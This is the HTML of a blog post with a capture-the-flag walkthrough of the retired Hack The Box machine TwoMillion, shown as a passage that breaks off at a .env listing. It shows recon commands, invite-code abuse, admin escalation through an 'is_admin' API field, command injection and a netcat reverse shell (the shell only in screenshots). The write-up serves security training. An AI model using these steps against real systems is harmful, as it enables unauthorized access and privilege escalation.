@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:Bhavik Kanejiya]">
+<meta name="description" content="Dive into this detailed walkthrough of the Hack The Box machine, covering enumeration, exploitation, and privilege escalation techniques to achieve root." />
+<meta name="keywords" content="Cybersecurity, Ethical Hacking, Penetration Testing, Kubernetes Security, Digital Defense, CTF, Cloud Security, Red Teaming, Cyber Forensics, Security Awareness, API Security, OWASP Top 10, Walkthrough, HTB, CVE-2023-0386, OverlayFS Exploit, Linux Exploitation, CVE Exploitation" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://bhavik-kanejiya.github.io/blog/htb-twomillion-walkthrough/" />
+
+
+    <title>
+        
+            HTB TwoMillion Walkthrough :: From Bits to Bytes 
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="https://bhavik-kanejiya.github.io/main.min.ab5336003ba331300318b49292c672210905baf1ef5410a739f647e70c8808fa.css" integrity="sha256-q1M2ADujMTADGLSSksZyIQkFuvHvVBCnOfZH5wyICPo=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://bhavik-kanejiya.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://bhavik-kanejiya.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://bhavik-kanejiya.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://bhavik-kanejiya.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://bhavik-kanejiya.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://bhavik-kanejiya.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="HTB TwoMillion Walkthrough">
+<meta itemprop="description" content="Dive into this detailed walkthrough of the Hack The Box machine, covering enumeration, exploitation, and privilege escalation techniques to achieve root."><meta itemprop="datePublished" content="2025-01-18T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2025-01-18T00:00:00+00:00" />
+<meta itemprop="wordCount" content="2526"><meta itemprop="image" content="https://bhavik-kanejiya.github.io/images/social-image.png" />
+<meta itemprop="keywords" content="Walkthrough,HTB,CVE-2023-0386,OverlayFS Exploit,Linux Exploitation,CVE Exploitation," />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://bhavik-kanejiya.github.io/images/social-image.png" /><meta name="twitter:title" content="HTB TwoMillion Walkthrough"/>
+<meta name="twitter:description" content="Dive into this detailed walkthrough of the Hack The Box machine, covering enumeration, exploitation, and privilege escalation techniques to achieve root."/>
+
+
+
+
+
+    <meta property="article:section" content="Hack The Box" />
+
+    <meta property="article:section" content="Walkthrough" />
+
+    <meta property="article:section" content="HTB" />
+
+
+
+    <meta property="article:published_time" content="2025-01-18 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://bhavik-kanejiya.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                bhavikkanejiya/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://bhavik-kanejiya.github.io/about/">🔎 About Me</a></li><li><a href="https://bhavik-kanejiya.github.io/blog/">📚 Blog</a></li><li><a href="https://bhavik-kanejiya.github.io/resume/">📄 Resume</a></li><li><a href="https://bhavik-kanejiya.github.io/tags/">🏷 Tags</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://bhavik-kanejiya.github.io/blog/htb-twomillion-walkthrough/">HTB TwoMillion Walkthrough</a></h2>
+
+            
+            
+            
+                <hr />
+                <aside id="toc">
+                <div class="toc-title">Table of Contents</div>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#box-info">Box Info</a></li>
+    <li><a href="#footprinting">Footprinting</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+      </ul>
+    </li>
+    <li><a href="#port---22-enumeration">Port - 22 Enumeration</a></li>
+    <li><a href="#port---80-enumeration">Port - 80 Enumeration</a>
+      <ul>
+        <li><a href="#response-headers">Response Headers</a></li>
+        <li><a href="#technology-detection">Technology Detection</a></li>
+        <li><a href="#application-overview">Application Overview</a></li>
+        <li><a href="#obfuscated-code">Obfuscated Code</a></li>
+        <li><a href="#generate-invitation-token">Generate Invitation Token</a></li>
+        <li><a href="#registration-page">Registration Page</a></li>
+      </ul>
+    </li>
+    <li><a href="#user-dashboard">User Dashboard</a>
+      <ul>
+        <li><a href="#available-api-endpoints">Available API Endpoints</a></li>
+        <li><a href="#check-user-admin-right-status">Check User Admin Right Status</a></li>
+        <li><a href="#update-the-user-rights">Update the User Rights</a></li>
+        <li><a href="#command-execution">Command Execution</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-www-data">Shell as www-data</a>
+      <ul>
+        <li><a href="#get-the-user-flag">Get the User Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-admin">Shell as admin</a>
+      <ul>
+        <li><a href="#shell-as-admin-1">Shell as admin</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-root">Shell as root</a>
+      <ul>
+        <li><a href="#failed-attempt">Failed Attempt</a></li>
+        <li><a href="#cve-2023-0386-analysis">CVE-2023-0386 Analysis</a></li>
+        <li><a href="#geting-root-flag">Geting Root Flag</a></li>
+        <li><a href="#thank-you-message-from-htb-team">Thank You Message from HTB Team</a></li>
+      </ul>
+    </li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+                </aside>
+                <hr />
+            
+
+            <div class="post-content">
+                <h2 id="box-info">Box Info</h2>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118171354.png" alt=""></p>
+<table>
+<thead>
+<tr>
+<th><strong>Attribute</strong></th>
+<th><strong>Details</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Level</strong></td>
+<td>Easy</td>
+</tr>
+<tr>
+<td><strong>OS</strong></td>
+<td>Linux</td>
+</tr>
+<tr>
+<td><strong>Box URL</strong></td>
+<td><a href="https://www.hackthebox.com/machines/twomillion">HTB-TwoMillion</a></td>
+</tr>
+<tr>
+<td><strong>Box Status</strong></td>
+<td>Retired</td>
+</tr>
+<tr>
+<td><strong>About Box</strong></td>
+<td>TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="footprinting">Footprinting</h2>
+<h3 id="nmap">Nmap</h3>
+<p><code>nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; nmap -p- --min-rate <span style="color:#ae81ff">10000</span> 10.10.11.221
+</span></span><span style="display:flex;"><span>Nmap 7.94SVN scan initiated Sat Jan <span style="color:#ae81ff">18</span> 17:24:20 <span style="color:#ae81ff">2025</span> as: nmap -p- --min-rate <span style="color:#ae81ff">10000</span> -oN 1.basic.nmap.txt 10.10.11.221
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.221
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.22s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sat Jan 18 17:24:42 2025 -- 1 IP address (1 host up) scanned in 21.88 seconds</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&gt; nmap -sCV -p 22,80 10.10.11.221
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-18 17:35 IST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.221
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.22s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://2million.htb/
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.78 seconds
+</span></span></code></pre></div><p><strong>Let’s add 10.10.11.221 host to our /etc/hosts file:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;10.10.11.221 	2million.htb&#34;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><h2 id="port---22-enumeration">Port - 22 Enumeration</h2>
+<p>We tried the same thing for SSH. We login into SSH anonymous but it&rsquo;s also a failed attempt.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh anonymous@10.10.10.245
+</span></span><span style="display:flex;"><span>anonymous@10.10.10.245<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
+</span></span><span style="display:flex;"><span>Permission denied, please try again.
+</span></span></code></pre></div><h2 id="port---80-enumeration">Port - 80 Enumeration</h2>
+<h3 id="response-headers">Response Headers</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Server: nginx
+</span></span><span style="display:flex;"><span>Date: Sun, <span style="color:#ae81ff">19</span> Jan <span style="color:#ae81ff">2025</span> 08:32:05 GMT
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+</span></span><span style="display:flex;"><span>Transfer-Encoding: chunked
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Set-Cookie: PHPSESSID<span style="color:#f92672">=</span>srsk0h13obnn855016i953mfd7; path<span style="color:#f92672">=</span>/
+</span></span><span style="display:flex;"><span>Expires: Thu, <span style="color:#ae81ff">19</span> Nov <span style="color:#ae81ff">1981</span> 08:52:00 GMT
+</span></span><span style="display:flex;"><span>Cache-Control: no-store, no-cache, must-revalidate
+</span></span><span style="display:flex;"><span>Pragma: no-cache
+</span></span></code></pre></div><h3 id="technology-detection">Technology Detection</h3>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118175246.png" alt=""></p>
+<h3 id="application-overview">Application Overview</h3>
+<p>The application resembles HTB&rsquo;s old version from 2017. It includes pages such as Login, Invite, Hall of Fame, and FAQ.</p>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118192645.png" alt=""></p>
+<p>The the old version of HTB requires an invitation code for the user Sign</p>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118192712.png" alt=""></p>
+<p>I tried to play with the invitation code option and observed that the application is calling the 2 Javascript files that are being used to send API requests. We tried to see what the both js file contains.</p>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/SCR-20250118-qyvb.png" alt=""></p>
+<h3 id="obfuscated-code">Obfuscated Code</h3>
+<p>We found that the supposed to be inviteapi.min.js is responsible for sending the invitation validation request. The JavaScript file contains multiple keywords like POST, makeInviteCode, verifyInviteCode so looks like it is obfuscated.</p>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250119133421.png" alt="">
+We used <a href="https://de4js.kshift.me/">de4js JavaScript Deobfuscator and Unpacker</a> to get the JavaScript in Deobfuscated format.</p>
+<p><strong>Deobfuscated JavaScript:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">verifyInviteCode</span>(<span style="color:#a6e22e">code</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">formData</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">code</span>,
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dataType</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;json&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">formData</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/api/v1/invite/verify&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">response</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">response</span>);
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">response</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">response</span>);
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">makeInviteCode</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dataType</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;json&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/api/v1/invite/how/to/generate&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">response</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">response</span>);
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">response</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">response</span>);
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>From the deobfuscated JavaScript we can see that the JavaScript contains 2 functions.</p>
+<ol>
+<li>Function <strong>verifyInviteCode</strong> is responsible for verifying the Invitation code.</li>
+<li>Function <strong>makeInviteCode</strong> is responsible for generating the Invitation code.</li>
+</ol>
+<h3 id="generate-invitation-token">Generate Invitation Token</h3>
+<p>Upon sending a POST request for <a href="http://2million.htb/api/v1/invite/how/to/generate">How-to-Generate</a> application returns the ROT13 encrypted string.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST http://2million.htb/api/v1/invite/how/to/generate
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;0&#34;</span>:200,<span style="color:#e6db74">&#34;success&#34;</span>:1,<span style="color:#e6db74">&#34;data&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;data&#34;</span>:<span style="color:#e6db74">&#34;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr&#34;</span>,<span style="color:#e6db74">&#34;enctype&#34;</span>:<span style="color:#e6db74">&#34;ROT13&#34;</span><span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;hint&#34;</span>:<span style="color:#e6db74">&#34;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>We have converted the ROT13 string to cleartext format and it gave a hint for another endpoint.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>In order to generate the invite code, make a POST request to /api/v1/invite/generate
+</span></span></code></pre></div><p>Upon sending a POST request for <a href="http://2million.htb/api/v1/invite/generate">Generate-invite</a> application returns a base64 encoded string.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; curl -X POST http://2million.htb/api/v1/invite/generate
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;0&#34;</span>:200,<span style="color:#e6db74">&#34;success&#34;</span>:1,<span style="color:#e6db74">&#34;data&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;code&#34;</span>:<span style="color:#e6db74">&#34;ME1FRzQtQlJTQzMtSEhZSkQtUzQ1UUQ=&#34;</span>,<span style="color:#e6db74">&#34;format&#34;</span>:<span style="color:#e6db74">&#34;encoded&#34;</span><span style="color:#f92672">}}</span>
+</span></span></code></pre></div><p>We have converted the base64 encoded string to clear text format which gives us our invitation code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; echo <span style="color:#e6db74">&#34;ME1FRzQtQlJTQzMtSEhZSkQtUzQ1UUQ=&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span>0MEG4-BRSC3-HHYJD-S45QD
+</span></span></code></pre></div><h3 id="registration-page">Registration Page</h3>
+<p>We have entered our invitation code and which allows us to login into application with our username and password.</p>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118194554.png" alt=""></p>
+<h2 id="user-dashboard">User Dashboard</h2>
+<p>We have login into the application and we saw very limited options. A few of them are:</p>
+<ol>
+<li>Dashboard</li>
+<li>FAQ</li>
+<li>Generate the VPN Connection File</li>
+</ol>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118194641.png" alt=""></p>
+<h3 id="available-api-endpoints">Available API Endpoints</h3>
+<p>The interesting part of generating a VPN connection file was, It is called the <code>api/v1/user/vpn/download</code>. We can get the list of API endpoints by calling the <code>/api/v1</code>.</p>
+<p>It was observed that the application contains the admin API as well. Admin API contains 3 endpoints:</p>
+<ol>
+<li><strong>GET</strong> - <code>/api/v1/admin/auth</code> : Check if user is admin or not</li>
+<li><strong>POST</strong> - <code>/api/v1/admin/vpn/generate</code> : Generate VPN for specific user</li>
+<li><strong>PUT</strong> - <code>/api/v1/admin/settings/update</code> : Update user settings</li>
+</ol>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118195949.png" alt=""></p>
+<h3 id="check-user-admin-right-status">Check User Admin Right Status</h3>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118200428.png" alt=""></p>
+<h3 id="update-the-user-rights">Update the User Rights</h3>
+<p><strong>Update admin settings</strong> API returns the error message which shows that the API request is missing an email parameter.</p>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/SCR-20250118-rmpc.png" alt=""></p>
+<p>We have added the email parameter and sent the request. It&rsquo;s observed that the API request is missing the &ldquo;is_admin&rdquo; parameter.
+<img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118200809.png" alt=""></p>
+<p>We have added the missing parameter and based on the response it&rsquo;s observed that the User has now admin privilege.
+<img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118203710.png" alt=""></p>
+<h4 id="admin-access-check">Admin Access Check</h4>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118203632.png" alt=""></p>
+<h4 id="generate-vpn-file">Generate VPN File</h4>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118203602.png" alt=""></p>
+<h3 id="command-execution">Command Execution</h3>
+<p>It&rsquo;s observed that generated VPN profile endpoint is vulnerable to command Injection.
+<img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118203832.png" alt=""></p>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<p>To get the reverse shell, we are using the netcat command.</p>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118204518.png" alt=""></p>
+<p><img src="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118204546.png" alt="">
+Volia 🥳 We got the connection back to our terminal.</p>
+<p>Let&rsquo;s Upgrade the shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm
+</span></span></code></pre></div><pre tabindex="0"><code>ctrl + z
+</code></pre><pre tabindex="0"><code>stty raw -echo; fg
+</code></pre><h3 id="get-the-user-flag">Get the User Flag</h3>
+<p>Let&rsquo;s cat the user flag…! Look like www-data user doesn&rsquo;t have permission to view the file.</p>
+<pre tabindex="0"><code>www-data@2million:/home/admin$ cat user.txt
+cat: user.txt: Permission denied
+</code></pre><p><strong>List the Files, Directories and it&rsquo;s permission:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@2million:/home/admin$ ls -al
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">32</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> admin admin <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2023</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root  root  <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2023</span> ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root  root     <span style="color:#ae81ff">9</span> May <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2023</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> admin admin  <span style="color:#ae81ff">220</span> May <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2023</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> admin admin <span style="color:#ae81ff">3771</span> May <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2023</span> .bashrc
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> admin admin <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2023</span> .cache
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> admin admin  <span style="color:#ae81ff">807</span> May <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2023</span> .profile
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> admin admin <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2023</span> .ssh
+</span></span><span style="display:flex;"><span>-rw-r----- <span style="color:#ae81ff">1</span> root  admin   <span style="color:#ae81ff">33</span> Jan <span style="color:#ae81ff">18</span> 12:03 user.txt
+</span></span></code></pre></div><h2 id="shell-as-admin">Shell as admin</h2>
+<p>We tried few ways to login as admin. From hint, we found that the .env file contains the DB username and password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@2million:~/html$ ls -al
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">56</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">10</span> root root <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 15:20 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2023</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">87</span> Jun  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2023</span> .env
